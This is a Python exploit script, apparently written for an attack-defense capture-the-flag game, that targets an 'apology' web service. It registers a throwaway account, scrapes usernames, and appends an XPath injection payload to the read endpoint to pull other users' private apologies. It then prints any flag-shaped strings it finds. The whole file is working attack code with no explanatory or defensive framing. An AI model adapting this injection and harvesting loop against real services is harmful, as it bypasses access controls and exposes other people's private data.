from string import  ascii_letters
from base64 import b64encode
from random import choice
import requests as rq
import sys 
import re

def gen_random_string(N=10):
	return "".join(choice(ascii_letters) for i in range(N))

def create_headers(username, password):
	auth_string = b64encode("{}:{}".format(username, password).encode()).decode()
	headers = {"Authorization":"Basic {}".format(auth_string)}
	return headers

try:
	host = sys.argv[1]
except:
	host = "127.0.0.1"
url = "http://{}:14567".format(host)
payload = "']/../apology[@private='true"

url_register = url + "/register"
username = gen_random_string()
password = gen_random_string()
rq.post(url_register, data={"username":username, "password":password})
headers = create_headers(username, password)
res_main_page = rq.get(url)
mass_login = re.findall(r"<tr>\n<td>(\w+)</td>", res_main_page.text)[1:]
for login in mass_login:
	url_det_id = url + "/apology/find?nickname_sender={}".format(login)
	res_get_ids = rq.get(url_det_id, headers=headers)
	mass_ids = re.findall(r"amp;id=(\w+)", res_get_ids.text)
	for id_apology in mass_ids:
		url_get_apology = url + "/apology/read?nickname_sender={}&id={}".format(login, id_apology)
		res_apology_flag = rq.get(url_get_apology + payload, headers=headers)
		mass_flags = re.findall(r"\w{31}=", res_apology_flag.text)
		for flag in mass_flags:
			print(flag)
